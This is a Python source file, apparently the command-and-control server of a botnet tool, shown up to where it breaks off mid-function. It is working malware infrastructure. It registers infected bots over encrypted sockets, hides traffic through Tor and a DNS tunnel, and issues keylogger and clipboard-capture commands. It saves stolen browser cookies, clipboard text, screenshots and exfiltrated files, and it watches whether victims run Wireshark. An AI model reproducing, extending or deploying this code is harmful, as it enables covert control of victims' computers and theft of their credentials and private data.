from http.server import HTTPServer, BaseHTTPRequestHandler
from stem.process import launch_tor_with_config
from urllib.parse import urlparse, parse_qs 
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from socketserver import ThreadingMixIn
from stem.control import Controller
from Crypto.Cipher import AES
from datetime import datetime
from stem.util import term
from stem import Signal
from queue import Queue
import threading
import readline
import platform
import requests
import hashlib
import socket
import base64
import struct
try:
    import socks  # PySocks for SOCKS5 proxy support
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False
    print("\033[93m[!] PySocks not available. Tor proxy features limited.\033[0m")
try:
    import dnslib
    from dnslib.server import DNSServer, DNSHandler, BaseResolver
    from dnslib import DNSRecord, QTYPE, RR, A, TXT
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False
    print("\033[93m[!] dnslib not available. DNS Tunneling features disabled.\033[0m")
import json
import time
import os


# Web dashboard import
try:
    from web_dashboard import start_web_dashboard
    WEB_DASHBOARD_AVAILABLE = True
except ImportError:
    WEB_DASHBOARD_AVAILABLE = False
    print("\033[93m[!] Web dashboard not available. \033[0m")

class C2Server:

    # Class-level commands dictionary
    commands = {}
    
    def __init__(self, host='0.0.0.0', port=8080, encryption_key="SecretBotNetKey2025"):
        self.host = host
        self.port = port
        self.bots = {}
        self.lock = threading.Lock()
        self.active = False
        self.command_queue = Queue()
        self.encryption_key = hashlib.sha256(encryption_key.encode()).digest()
        self.show_banner()
        os.makedirs("clipboard_data", exist_ok=True)
        
        # File server settings
        self.file_server_enabled = False
        self.file_server_host = '0.0.0.0'
        self.file_server_port = 8000
        self.file_server_thread = None
        self.file_server_tokens = {}  # bot_id: {token, expiry}
        self.file_server = None
        os.makedirs("bot_files", exist_ok=True)
        
        # Tor settings
        self.tor_enabled = False
        self.tor_process = None
        self.tor_controller = None
        self.tor_port = 9050  # Varsayılan Tor portu
        self.tor_proxy = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
        # P2P port aralığı bilgisi (botlara iletilmek için)
        self.p2p_port_range = (49152, 65535)
        self.ipv6_enabled = socket.has_ipv6
        # Güvenlik kuralları ve P2P durumu takibi
        self.security_rules_enabled = True
        self.p2p_status = {}  # Bot ID -> P2P durumu
        self.wireshark_alerts = {}  # Bot ID -> Wireshark uyarıları
        # Web dashboard ayarları
        self.web_dashboard_enabled = False
        self.web_dashboard_host = '0.0.0.0'
        self.web_dashboard_port = 5500
        self.web_dashboard_thread = None
        
        # DNS Tunneling settings
        self.dns_tunnel_enabled = False
        self.dns_tunnel_domain = None
        self.dns_server = None
        self.dns_server_thread = None
        self.dns_port = 53
        self.dns_responses = {}  # Query ID -> Response data
        
        
        # Vulnerability Scanner entegrasyonu (Disabled)
        self.vuln_scanner_enabled = False
        self.bot_vulnerabilities = {}  # Bot ID -> Zafiyet listesi
        self.platform_stats = {}  # Platform istatistikleri
        self._init_vuln_scanner()
        
        # AI/ML entegrasyonu kaldırıldı (istek üzerine)
        self.ai_ml_enabled = False
        self.ai_commands = {}
        
        # Network Mapping entegrasyonu
        self.network_maps_enabled = True
        self.network_maps = {}  # Bot ID -> Network map Datas
        self.network_maps_dir = "network_maps"
        os.makedirs(self.network_maps_dir, exist_ok=True)
        self._init_network_maps()
        
        # Komut geçmişi özellikleri
        self.command_history = []
        self.history_file = "command_history.txt"
        self.max_history = 100
        self._load_command_history()
        self._setup_readline()

    def show_banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        banner = r"""
            [Flexible and Powerful Botnet Tool]
  ___   __    ______   _________         ______   _____       
 /__/\ /__/\ /_____/\ /________/\       /_____/\ /_____/\     
 \::\_\\  \ \\::::_\/_\__....__\/_______\:::__\/ \:::_:\ \    
  \:. `-\  \ \\:\/___/\  \::\ \ /______/\\:\ \  __   _\:\|    
   \:. _    \ \\::___\/_  \::\ \\__::::\/ \:\ \/_/\ /::_/__   
    \. \`-\  \ \\:\____/\  \::\ \          \:\_\ \ \\:\____/\ 
     \__\/ \__\/ \_____\/   \__\/           \_____\/ \_____\/ 
                                By: Zer0 Crypt0
                                     version: 1.0.0
        """
        print("\033[95m" + banner + "\033[0m")
        print(f"\033[36m[+]\033[0m \033[94mListening on {self.host}:{self.port}\033[0m")
        print("\033[36m[+]\033[0m \033[94mWaiting for bots to connect...\033[0m\n")
    
    def start_tor(self):
        """Starting the Tor service"""
        try:
            if not self.tor_process:
                print(term.format("[+] Starting Tor", term.Color.BLUE))
                # Önce mevcut Tor'a bağlanmayı dene
                try:
                    self.tor_controller = Controller.from_port(address="127.0.0.1", port=9051)
                    self.tor_controller.authenticate()
                    print("\033[92m[+] Tor Controller connected\033[0m")
                    self.tor_enabled = True
                    return True
                except Exception as ce:
                    print(f"\033[93m[!] Tor Controller connect failed: {ce}\033[0m")
                    # Kontrol portu yoksa Stem ile Tor'u gerekli ayarlarla başlat
                    try:
                        self.tor_process = launch_tor_with_config(config={
                            'SocksPort': '9050',
                            'ControlPort': '9051',
                            'CookieAuthentication': '0'
                        }, take_ownership=True, timeout=30)
                        time.sleep(3)
                        self.tor_controller = Controller.from_port(address="127.0.0.1", port=9051)
                        self.tor_controller.authenticate()
                        print("\033[92m[+] Tor Service started and Controller connected\033[0m")
                        self.tor_enabled = True
                        return True
                    except Exception as le:
                        print(f"\033[91m[!] Tor Startup Error: {le}\033[0m")
                        self.tor_enabled = False
                        return False
            else:
                print("\033[93m[!] Tor is Already Running\033[0m")
                return False
        except Exception as e:
            print(f"\033[91m[!] Tor Startup Error: {e}\033[0m")
            return False
    
    def stop_tor(self):
        try:
            if self.tor_process:
                print("\033[94m[*] Tor Service Stopping...\033[0m")
                # Tor'u durdur
                self.tor_process.terminate()
                self.tor_process.wait()
                self.tor_process = None
                # Controller'ı kapat
                try:
                    if self.tor_controller:
                        self.tor_controller.close()
                        self.tor_controller = None
                except Exception:
                    pass
                print("\033[92m[+] Tor Service Stopped\033[0m")
                return True
            else:
                print("\033[93m[!] Tor is Not Running\033[0m")
                return False
        except Exception as e:
            print(f"\033[91m[!] Tor Stopping Error: {e}\033[0m")
            return False
    
    def renew_tor_identity(self):
        try:
            # Stem Controller üzerinden NEWNYM sinyali gönder
            if self.tor_controller is None:
                try:
                    self.tor_controller = Controller.from_port(address="127.0.0.1", port=9051)
                    self.tor_controller.authenticate()
                except Exception as ce:
                    print(f"\033[91m[!] Tor Control Connection Not Found: {ce}\033[0m")
                    return False
            self.tor_controller.signal(Signal.NEWNYM)
            print("\033[92m[+] Tor Identity Renewed\033[0m")
            return True
        except Exception as e:
            print(f"\033[91m[!] Tor Identity Renewal Error: {e}\033[0m")
            return False
    
    def send_via_tor(self, data, host, port):
        """Send data via Tor SOCKS5 proxy"""
        if not SOCKS_AVAILABLE:
            print(f"\033[91m[!] PySocks not available. Install with: pip install PySocks\033[0m")
            return False
            
        try:
            # SOCKS5 proxy üzerinden bağlantı kur
            sock = socks.socksocket()
            sock.set_proxy(socks.SOCKS5, "127.0.0.1", self.tor_port)
            sock.settimeout(10)  # 10 saniye timeout
            sock.connect((host, port))
            
            # Veriyi gönder
            sock.send(data)
            
            # Yanıt al
            response = sock.recv(4096)
            sock.close()
            
            print(f"\033[92m[+] Data sent via Tor successfully\033[0m")
            return response
        except Exception as e:
            print(f"\033[91m[!] Error sending via Tor: {e}\033[0m")
            print(f"\033[93m[*] Make sure Tor is running on port {self.tor_port}\033[0m")
            return False
    
    def start_dns_tunnel(self, domain):
        """Start DNS Tunneling server"""
        if not DNS_AVAILABLE:
            print(f"\033[91m[!] dnslib not available. Install with: pip install dnslib\033[0m")
            return False
        
        if self.dns_tunnel_enabled:
            print(f"\033[93m[!] DNS Tunneling already enabled\033[0m")
            return False
        
        try:
            self.dns_tunnel_domain = domain
            
            # DNS Resolver sınıfı
            class DNSTunnelResolver(BaseResolver):
                def __init__(self, c2_server):
                    self.c2 = c2_server
                
                def resolve(self, request, handler):
                    reply = request.reply()
                    qname = str(request.q.qname).rstrip('.')
                    qtype = request.q.qtype
                    
                    # Domain kontrolü
                    if not qname.endswith(self.c2.dns_tunnel_domain):
                        # Başka domain ise normal DNS response dön
                        return reply
                    
                    try:
                        # Subdomain'den veriyi çıkar
                        # Format: <base64_data>.<domain>
                        subdomain = qname.replace(f'.{self.c2.dns_tunnel_domain}', '')
                        
                        if not subdomain:
                            return reply
                        
                        # Base64 decode
                        try:
                            encoded_data = subdomain.replace('-', '+').replace('_', '/')
                            # Padding ekle
                            padding = 4 - (len(encoded_data) % 4)
                            if padding != 4:
                                encoded_data += '=' * padding
                            
                            decoded_data = base64.b64decode(encoded_data)
                            decrypted_data = self.c2.decrypt_data(decoded_data)
                            
                            # JSON parse
                            bot_data = json.loads(decrypted_data.decode('utf-8'))
                            
                            print(f"\033[94m[DNS Tunnel] Received from {bot_data.get('bot_id', 'Unknown')}\033[0m")
                            print(f"  \033[96m•\033[0m Action: {bot_data.get('action', 'unknown')}")
                            
                            # Bot'u kaydet
                            if bot_data.get('action') == 'dns_tunnel_connect':
                                bot_id = bot_data.get('bot_id')
                                with self.c2.lock:
                                    if bot_id not in self.c2.bots:
                                        self.c2.bots[bot_id] = {
                                            'ip': bot_data.get('ip', 'unknown'),
                                            'platform': bot_data.get('platform', 'unknown'),
                                            'hostname': bot_data.get('hostname', 'unknown'),
                                            'connection_type': 'dns_tunnel',
                                            'dns_tunnel': True,
                                            'last_seen': time.time()
                                        }
                                    else:
                                        self.c2.bots[bot_id]['dns_tunnel'] = True
                                        self.c2.bots[bot_id]['connection_type'] = 'dns_tunnel'
                                        self.c2.bots[bot_id]['last_seen'] = time.time()
                            
                            # Response hazırla
                            response_data = {
                                'status': 'ok',
                                'timestamp': time.time(),
                                'message': 'DNS Tunnel active'
                            }
                            
                            # Response'u şifrele ve encode et
                            response_json = json.dumps(response_data)
                            encrypted_response = self.c2.encrypt_data(response_json.encode('utf-8'))
                            encoded_response = base64.b64encode(encrypted_response).decode('utf-8')
                            
                            # URL-safe yap
                            encoded_response = encoded_response.replace('+', '-').replace('/', '_').replace('=', '')
                            
                            # TXT record olarak dön (255 karakter limiti)
                            if len(encoded_response) > 255:
                                encoded_response = encoded_response[:255]
                            
                            reply.add_answer(RR(
                                rname=qname,
                                rtype=QTYPE.TXT,
                                rdata=TXT(encoded_response),
                                ttl=0
                            ))
                            
                        except Exception as e:
                            print(f"\033[91m[DNS Tunnel] Decode error: {e}\033[0m")
                    
                    except Exception as e:
                        print(f"\033[91m[DNS Tunnel] Error: {e}\033[0m")
                    
                    return reply
            
            # DNS Server başlat
            resolver = DNSTunnelResolver(self)
            self.dns_server = DNSServer(resolver, port=self.dns_port, address='0.0.0.0')
            
            # Thread'de başlat
            self.dns_server_thread = threading.Thread(target=self.dns_server.start, daemon=True)
            self.dns_server_thread.start()
            
            self.dns_tunnel_enabled = True
            print(f"\033[92m[+] DNS Tunneling enabled\033[0m")
            print(f"  \033[96m•\033[0m Domain: {domain}")
            print(f"  \033[96m•\033[0m Port: {self.dns_port}")
            print(f"  \033[93m⚠️  Note: Port 53 requires root/admin privileges\033[0m")
            
            return True
            
        except PermissionError:
            print(f"\033[91m[!] Permission denied. Port 53 requires root/admin privileges\033[0m")
            print(f"\033[93m[*] Run with: sudo python3 Server.py\033[0m")
            return False
        except Exception as e:
            print(f"\033[91m[!] DNS Tunneling start error: {e}\033[0m")
            return False
    
    def stop_dns_tunnel(self):
        """Stop DNS Tunneling server"""
        if not self.dns_tunnel_enabled:
            print(f"\033[93m[!] DNS Tunneling not enabled\033[0m")
            return False
        
        try:
            if self.dns_server:
                self.dns_server.stop()
                self.dns_server = None
            
            self.dns_tunnel_enabled = False
            self.dns_tunnel_domain = None
            
            print(f"\033[92m[+] DNS Tunneling stopped\033[0m")
            return True
        except Exception as e:
            print(f"\033[91m[!] DNS Tunneling stop error: {e}\033[0m")
            return False


    def handle_bot(self, conn, addr):
        bot_ip = addr[0]
        bot_id = None
        try:
            # Enable TCP keepalive to detect dead peers
            try:
                conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            except Exception:
                pass
            
            # Framing helpers (length-prefixed packets)
            def recv_exact(n:int) -> bytes:
                buf = b''
                while len(buf) < n:
                    chunk = conn.recv(n - len(buf))
                    if not chunk:
                        raise ConnectionError("Connection closed while reading")
                    buf += chunk
                return buf
            
            def recv_packet() -> bytes:
                header = recv_exact(4)
                (length,) = struct.unpack('!I', header)
                if length <= 0 or length > 10 * 1024 * 1024:
                    raise ValueError("Invalid packet length")
                return recv_exact(length)
            
            def send_packet(data: bytes):
                conn.sendall(struct.pack('!I', len(data)) + data)
            # İlk bağlantıda bot kaydı (framed)
            data = recv_packet()
            if data:
                # Şifreli veriyi çöz
                decrypted_data = self.decrypt_data(data)
                message = json.loads(decrypted_data)
                bot_id = message.get('bot_id')
                
            
                with self.lock:
                    # Gerçek IP'yi kullan, yoksa bağlantı IP'sini kullan
                    display_ip = message.get('real_ip', bot_ip)
                    self.bots[bot_id] = {
                        'ip': display_ip,  # Gerçek IP'yi kaydet
                        'connection_ip': bot_ip,  # Bağlantı IP'sini de sakla
                        'last_seen': time.time(),
                        'conn': conn,
                        'response_received': threading.Event(),
                        'tor_enabled': message.get('tor_enabled', False),
                        'platform': message.get('platform', 'Unknown')
                    }
                print(f"\033[92m[+] New bot connected: {bot_id} ({display_ip})")
                if message.get('tor_enabled', False):
                    print(f"\033[94m[+] Bot connected via Tor\033[0m")
                else:
                    print(f"\033[94m[+] Bot connected via Clearnet\033[0m")
            
                # Şifrelenmiş yanıt gönder (P2P port aralığı eklendi)
                response = json.dumps({
                    'status': 'registered',
                    'p2p_port_range': self.p2p_port_range,
                    'ipv6_enabled': True  # IPv6 desteği bilgisi
                }).encode('utf-8')
                encrypted_response = self.encrypt_data(response)
                send_packet(encrypted_response)

            # Komut ve yanıt döngüsü
            while self.active:
                try:
                    # Komut gönder
                    if not self.command_queue.empty():
                        cmd = self.command_queue.get()
                        if cmd['bot_id'] == bot_id or cmd['bot_id'] == 'broadcast':
                            # Komutu şifrele
                            command_data = json.dumps(cmd).encode('utf-8')
                            encrypted_command = self.encrypt_data(command_data)
                            
                            # Tor kontrolü - eğer Tor aktifse ve bot Tor üzerinden bağlıysa
                            bot_via_tor = self.bots[bot_id].get('tor_enabled', False)
                            if self.tor_enabled and bot_via_tor and SOCKS_AVAILABLE:
                                print(f"\033[94m[*] Sending command via Tor to {bot_id}\033[0m")
                                # Gerçek Tor SOCKS5 proxy kullan
                                try:
                                    # Bot'un IP ve port bilgisini al
                                    bot_ip = self.bots[bot_id].get('ip', addr[0])
                                    # Tor üzerinden gönder
                                    tor_response = self.send_via_tor(encrypted_command, bot_ip, self.port)
                                    if not tor_response:
                                        # Tor başarısız olursa normal socket'e geri dön
                                        print(f"\033[93m[*] Tor failed, falling back to clearnet for {bot_id}\033[0m")
                                        send_packet(encrypted_command)
                                except Exception as e:
                                    print(f"\033[91m[!] Tor send error: {e}\033[0m")
                                    send_packet(encrypted_command)
                            else:
                                # Normal clearnet üzerinden gönder
                                if self.tor_enabled and bot_via_tor and not SOCKS_AVAILABLE:
                                    print(f"\033[93m[*] Tor requested but PySocks not available, using clearnet\033[0m")
                                send_packet(encrypted_command)
                            
                            self.bots[bot_id]['response_received'].clear()

                    # Yanıt al (framed)
                    conn.settimeout(2)
                    response = recv_packet()
                    if response:
                        # Şifreli yanıtı çöz
                        decrypted_response = self.decrypt_data(response)
                        response_data = json.loads(decrypted_response)
                        # Heartbeat ise sadece last_seen güncelle
                        if response_data.get('action') == 'heartbeat' and bot_id:
                            with self.lock:
                                if bot_id in self.bots:
                                    self.bots[bot_id]['last_seen'] = time.time()
                            continue
                        
                        if response_data.get('alert_type') == 'wireshark_status':
                            bot_id = response_data.get('bot_id')
                            status = "DURDU" if response_data.get('is_active') else "DEVAM EDIYOR"
                            print(f"\033[91m[!] {bot_id} Wireshark durumu: {status}\033[0m")
                            continue  # Diğer işlemleri atla
                        
                        elif response_data.get('alert_type') == 'analiz_tespit':
                            bot_id = response_data.get('bot_id')
                            alert_msg = response_data.get('output', 'Unknown alert')
                            print(f"\033[91m[!] {bot_id} Güvenlik Uyarısı: {alert_msg}\033[0m")
                            
                            # Wireshark uyarısını kaydet
                            with self.lock:
                                self.wireshark_alerts[bot_id] = {
                                    'timestamp': time.time(),
                                    'message': alert_msg,
                                    'status': 'detected'
                                }
                            continue
                        
                        elif response_data.get('alert_type') == 'analiz_temiz':
                            bot_id = response_data.get('bot_id')
                            alert_msg = response_data.get('output', 'Analysis tools stopped')
                            print(f"\033[92m[+] {bot_id} Güvenlik Temizlendi: {alert_msg}\033[0m")
                            
                            # Wireshark uyarısını temizle
                            with self.lock:
                                if bot_id in self.wireshark_alerts:
                                    del self.wireshark_alerts[bot_id]
                            continue
                        
                        elif response_data.get('action') == 'p2p_status':
                            bot_id = response_data.get('bot_id')
                            p2p_status = response_data.get('p2p_status', 'unknown')
                            print(f"\033[94m[*] {bot_id} P2P Durumu: {p2p_status}\033[0m")
                            
                            # P2P durumunu kaydet
                            with self.lock:
                                self.p2p_status[bot_id] = {
                                    'status': p2p_status,
                                    'timestamp': time.time()
                                }
                            continue
                        
                        elif response_data.get('action') == 'vulnerability_scan':
                            # Vulnerability Scan Reports : Disabled :(
                            print("\033[93m[!] Vulnerability scan reports are disabled (ExploitDB/PacketStorm/NVD/CVE Details/SecurityFocus).\033[0m")
                            continue
                        
                        elif response_data.get('action') == 'security_alert':
                            bot_id = response_data.get('bot_id')
                            target_ip = response_data.get('target_ip')
                            security_message = response_data.get('security_message', 'Unknown security alert')
                            attack_blocked = response_data.get('attack_blocked', False)
                            security_details = response_data.get('security_details', {})
                            
                            print(f"\033[91m[!] {bot_id} Güvenlik Uyarısı:\033[0m")
                            print(f"   \033[96m•\033[0m Hedef: {target_ip}")
                            print(f"   \033[96m•\033[0m Mesaj: {security_message}")
                            print(f"   \033[96m•\033[0m Saldırı Engellendi: {'Evet' if attack_blocked else 'Hayır'}")
                            
                            # Güvenlik detaylarını göster
                            if security_details:
                                print(f"   \033[96m•\033[0m Güvenlik Detayları:")
                                print(f"     - Firewall: {'Tespit Edildi' if security_details.get('firewall_detected') else 'Tespit Edilmedi'}")
                                print(f"     - DDoS Koruması: {'Var' if security_details.get('ddos_protection') else 'Yok'}")
                                print(f"     - WAF: {'Tespit Edildi' if security_details.get('waf_detected') else 'Tespit Edilmedi'}")
                                print(f"     - Rate Limiting: {'Var' if security_details.get('rate_limiting') else 'Yok'}")
                                print(f"     - Güvenlik Seviyesi: {security_details.get('security_level', 'Unknown')}")
                            
                            # Güvenlik uyarısını kaydet
                            with self.lock:
                                if 'security_alerts' not in self.__dict__:
                                    self.security_alerts = {}
                                self.security_alerts[bot_id] = {
                                    'target_ip': target_ip,
                                    'message': security_message,
                                    'attack_blocked': attack_blocked,
                                    'security_details': security_details,
                                    'timestamp': time.time()
                                }
                            continue
                        
                        # Heartbeat mesajlarını yoksay (bağlantıyı canlı tutmak için)
                        elif response_data.get('action') == 'heartbeat':
                            continue

                        # Komut sonucu (Net.py -> action: 'command_result')
                        elif response_data.get('action') == 'command_result':
                            bot_id = response_data.get('bot_id', bot_id)
                            output = response_data.get('output', 'No output')
                            
                            # processes komutu için özel handling
                            if hasattr(self, '_pending_processes_command') and self._pending_processes_command.get('bot_id') == bot_id:
                                try:
                                    import json as _json
                                    data = _json.loads(output)
                                    
                                    # Dosyaya yazdır
                                    self._save_processes_to_file(bot_id, data)
                                    
                                    print("\n\033[95mProcess Information:\033[0m")
                                    self._print_processes_info(data)
                                    print()
                                    
                                    # Pending command'i temizle
                                    self._pending_processes_command = None
                                    
                                except Exception as e:
                                    print(f"\033[91m[!] Error processing processes info: {str(e)}\033[0m")
                                    print(f"Raw response: {output}")
                                    
                                    # Hata durumunda da raw response'u dosyaya yaz
                                    self._save_raw_processes_to_file(bot_id, str(output))
                                    
                                    # Pending command'i temizle
                                    self._pending_processes_command = None
                            else:
                                # Normal komut sonucu
                                print(f"\033[96m{bot_id}\033[0m : {output}")
                            
                            self.bots[bot_id]['response_received'].set()
                            continue

                        # Çerez sonucu: action 'cookies_result' olmalı
                        elif response_data.get('action') == 'cookies_result' and response_data.get('status') == 'success':
                            bot_id = response_data.get('bot_id')
                            cookies = response_data.get('cookies', [])
                            # cookies klasörü yoksa oluştur
                            os.makedirs("cookies", exist_ok=True)
                            with open(f"cookies/cookie_{bot_id}.txt", "w") as f:
                                if cookies:
                                    for cookie in cookies:
                                        f.write(f"{cookie['domain']}\t{cookie['name']}\t{cookie['value']}\n")
                                    print(f"\033[92m[+] {bot_id} çerezleri kaydedildi\033[0m")
                                else:
                                    f.write("Cookies are empty")
                                    print(f"\033[93m[!] {bot_id} çerez bulunamadı\033[0m")
                        
                        elif response_data.get('action') == 'clipboard_data':
                            bot_id = response_data.get('bot_id', 'unknown')
                            clipboard_data = response_data.get('data', '')
                            filename = f"clipboard_data/copy_{bot_id.replace('/', '_').replace('\\', '_')}.txt"
                            with open(filename, "a", encoding="utf-8") as f:
                                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: {clipboard_data}\n")
                            print(f"\033[92m[+] Clipboard data saved to {filename}\033[0m")
                            continue
                        
                        elif response_data.get('type') == 'screenshot':
                            bot_id = response_data.get('bot_id', 'unknown')
                            filename = response_data.get('filename', 'screenshot.png')
                            img_data = response_data.get('data', '')
                            
                            # ScreenS klasörünü oluştur
                            os.makedirs("ScreenS", exist_ok=True)
                            
                            # Base64'ten PNG'ye çevir ve kaydet
                            try:
                                import base64
                                img_bytes = base64.b64decode(img_data)
                                filepath = f"ScreenS/{filename}"
                                with open(filepath, "wb") as f:
                                    f.write(img_bytes)
                                print(f"\033[92m[+] Screenshot saved: {filepath}\033[0m")
                            except Exception as e:
                                print(f"\033[91m[!] Screenshot save error: {e}\033[0m")
                            continue
                        
                        elif response_data.get('action') == 'network_map_data':
                            bot_id = response_data.get('bot_id', 'unknown')
                            network_data = response_data.get('network_data', {})
                            map_format = response_data.get('map_format', 'json')
                            scope = response_data.get('scope', 'unknown')
                            timestamp = response_data.get('timestamp', time.time())
                            
                            # Network map verilerini işle ve kaydet
                            self._process_network_map(bot_id, network_data, map_format, scope, timestamp)
                            continue
                        
                        elif response_data.get('action') == 'file_download':
                            bot_id = response_data.get('bot_id', 'unknown')
                            file_info = response_data.get('file_info', {})
                            file_content = response_data.get('file_content', '')
                            
                            try:
                                # Dosya bilgilerini al
                                file_name = file_info.get('name', 'unknown_file')
                                file_path = file_info.get('path', '')
                                file_size = file_info.get('size', 0)
                                
                                # Dosya adını güvenli hale getir
                                safe_filename = "".join(c for c in file_name if c.isalnum() or c in ('.-_')).rstrip()
                                if not safe_filename:
                                    safe_filename = f"downloaded_file_{int(time.time())}"
                                
                                # Server'ın çalıştığı dizine kaydet (downloads/ altına değil)
                                file_full_path = safe_filename
                                
                                # Base64 decode et ve kaydet
                                file_content_decoded = base64.b64decode(file_content)
                                with open(file_full_path, 'wb') as f:
                                    f.write(file_content_decoded)
                                
                                print(f"\033[92m[+] 📁 Dosya indirildi: {safe_filename}\033[0m")
                                print(f"  \033[96m•\033[0m Boyut: {file_size:,} bytes")
                                print(f"  \033[96m•\033[0m Konum: {file_full_path}")
                                print(f"  \033[96m•\033[0m Bot: {bot_id}")
                                
                                # İndirme logunu kaydet
                                download_log = {
                                    'timestamp': time.time(),
                                    'bot_id': bot_id,
                                    'original_path': file_path,
                                    'saved_path': file_full_path,
                                    'file_size': file_size
                                }
                                
                                # Log dosyasına kaydet
                                log_file = 'download_log.json'
                                try:
                                    if os.path.exists(log_file):
                                        with open(log_file, 'r') as f:
                                            logs = json.load(f)
                                    else:
                                        logs = []
                                    
                                    logs.append(download_log)
                                    
                                    with open(log_file, 'w') as f:
                                        json.dump(logs, f, indent=2)
                                except:
                                    pass
                                    
                            except Exception as e:
                                print(f"\033[91m[!] Dosya kaydetme hatası: {str(e)}\033[0m")
                            
                            continue
                        
                        elif response_data.get('action') == 'folder_detected':
                            bot_id = response_data.get('bot_id', 'unknown')
                            remote_path = response_data.get('remote_path', '')
                            folder_contents = response_data.get('folder_contents', [])
                            folder_size = response_data.get('folder_size', 0)
                            
                            print(f"\033[94m[📁] Klasör tespit edildi (Bot: {bot_id})\033[0m")
                            print(f"  \033[96m•\033[0m Yol: {remote_path}")
                            print(f"  \033[96m•\033[0m Toplam Boyut: {folder_size:,} bytes")
                            print(f"  \033[96m•\033[0m İçerik Sayısı: {len(folder_contents)}")
                            
                            if folder_contents:
                                print(f"  \033[96m•\033[0m İçerik:")
                                for item in folder_contents[:10]:  # İlk 10 öğe
                                    item_type = "📁" if item.get('type') == 'folder' else "📄"
                                    item_size = f"({item.get('size', 0):,} bytes)" if item.get('size') else ""
                                    print(f"    {item_type} {item.get('name', 'Unknown')} {item_size}")
                                
                                if len(folder_contents) > 10:
                                    print(f"    ... ve {len(folder_contents) - 10} öğe daha")
                            
                            print(f"\033[93m[!] Klasörler indirilmez, sadece dosyalar indirilebilir\033[0m")
                            continue
                        
                        print(f"\033[96m{bot_id}\033[0m : {response_data.get('output', 'No output')}")
                        self.bots[bot_id]['response_received'].set()
                    else:
                        break
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"\033[91m[!] Communication error: {e}\033[0m")
                    break
                
        except Exception as e:
            print(f"\033[91m[!] Error with {bot_id if bot_id else 'bot'}: {e}\033[0m")
        finally:
            if bot_id:
                with self.lock:
                    if bot_id in self.bots:
                        del self.bots[bot_id]
                print(f"\033[93m[-] Bot disconnected: {bot_id}\033[0m")
            conn.close()
    
    def handle_command(self, command):
        """Handle incoming commands from the console"""
        if not command.strip():
            return
            
        # Split command into parts
        parts = command.split()
        cmd = parts[0].lower()
        args = parts[1:] if len(parts) > 1 else []
        
        # Check for help request (? at the end)
        if len(args) > 0 and args[-1] == '?':
            # Handle compound commands like "tor enable ?"
            if len(args) > 1:
                compound_cmd = f"{cmd} {args[0]}"
                if compound_cmd in ['tor enable', 'tor disable', 'tor renew', 'tor status', 'web start', 'web stop', 'web status']:
                    self._show_command_help(cmd)  # Show main command help
                    return
            self._show_command_help(cmd)
            return
        
        # Handle single word help requests like "tor ?"
        if cmd in ['tor', 'web', 'keylogger', 'clipboard'] and len(args) == 1 and args[0] == '?':
            self._show_command_help(cmd)
            return
        
        # Handle file server commands
        if cmd == 'fileserver':
            result = self.handle_fileserver_command(args)
            print(result)
            return
            
        # Handle token generation
        elif cmd == 'token':
            result = self.handle_token_command(args)
            print(result)
            return
            
        # Handle file upload (send to bot)
        elif cmd == 'upload':
            if len(args) < 2:
                self._show_command_help('upload')
                return
            bot_id = args[0]
            local_file = args[1]
            remote_name = args[2] if len(args) > 2 else os.path.basename(local_file)
            if not os.path.exists(local_file):
                print(f"Error: File not found: {local_file}")
                return
            try:
                with open(local_file, 'rb') as f:
                    file_bytes = f.read()
                b64_data = base64.b64encode(file_bytes).decode('utf-8')
                self.command_queue.put({
                    'bot_id': bot_id,
                    'command': f"file_upload {remote_name} {b64_data}",
                    'action': 'file_upload',
                    'silent': True
                })
                print(f"\033[92m[+] File upload command queued for {bot_id}: {remote_name}\033[0m")
            except Exception as e:
                print(f"\033[91m[!] File read error: {e}\033[0m")
            return
            
        # Handle file download
        elif cmd == 'download':
            if len(args) < 2:
                self._show_command_help('download')
                return
                
            bot_id = args[0]
            remote_file = args[1]
            local_path = args[2] if len(args) > 2 else os.path.basename(remote_file)
            
            # Check if file exists in bot's directory
            bot_dir = os.path.join('bot_files', bot_id)
            src_path = os.path.join(bot_dir, remote_file)
            
            if not os.path.exists(src_path):
                print(f"Error: File not found in bot {bot_id}: {remote_file}")
                return
                
            # Copy file from bot's directory
            try:
                import shutil
                shutil.copy2(src_path, local_path)
                print(f"File downloaded successfully from {bot_id} to {local_path}")
            except Exception as e:
                print(f"Error downloading file: {str(e)}")
            return
            
        # Handle other commands
        elif cmd in ["keylogger_start", "keylogger_stop", "clipboard_start", "clipboard_stop"]:
            self.command_queue.put({
                'bot_id': args[0],
                'command': cmd,
                'action': 'execute',
                'silent': True  # Ana konsola çıktı yazılmayacak
            })
            return

        # Legacy 'upload <PATH> <ID>' form is removed; use 'upload <bot_id> <local_file>'

        self.command_queue.put({
            'bot_id': args[0],
            'command': cmd,
            'action': 'execute'
        })
        return True

    def encrypt_data(self, data):
        """Veriyi AES-256-GCM ile şifreler (nonce + ciphertext + tag)"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        # 12 bayt nonce (GCM için önerilen)
        nonce = get_random_bytes(12)
        cipher = AES.new(self.encryption_key, AES.MODE_GCM, nonce=nonce)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        # nonce + ciphertext + tag olarak birleştir
        return nonce + ciphertext + tag

    def decrypt_data(self, encrypted_data):
        """AES-256-GCM ile şifreli veriyi çözer (nonce + ciphertext + tag)"""
        try:
            # Nonce ilk 12 bayt, tag son 16 bayt
            if len(encrypted_data) < 12 + 16:
                raise ValueError("Encrypted payload too short")
            nonce = encrypted_data[:12]
            tag = encrypted_data[-16:]
            ciphertext = encrypted_data[12:-16]
            cipher = AES.new(self.encryption_key, AES.MODE_GCM, nonce=nonce)
            decrypted_data = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted_data.decode('utf-8')
        except Exception as e:
            # Eski format (CBC) için geriye dönük uyumluluk
            try:
                iv = encrypted_data[:16]
                actual_data = encrypted_data[16:]
                cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
                decrypted_data = unpad(cipher.decrypt(actual_data), AES.block_size)
                return decrypted_data.decode('utf-8')
            except Exception:
                raise e

    def send_command(self, bot_id, command):
        with self.lock:
